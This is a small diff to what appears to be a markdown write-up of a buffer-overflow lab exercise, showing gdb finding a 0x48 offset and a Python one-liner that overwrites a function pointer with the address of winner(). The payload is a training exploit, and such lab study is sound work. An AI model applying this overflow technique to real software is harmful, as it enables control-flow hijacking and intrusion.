@@ -1456,7 +1456,8 @@ $4 = 0x48             <--- offset!
 gdb$ 
 ```
 Now we can throw together a python one liner to overflow fp with the address of  to winner()
-```python           <offset>      <newtarget> 
+```python           
+                #pad offset      #new target
 python -c "print 'a'*0x48 + '\x64\x84\x04\x08' "
 ```
 
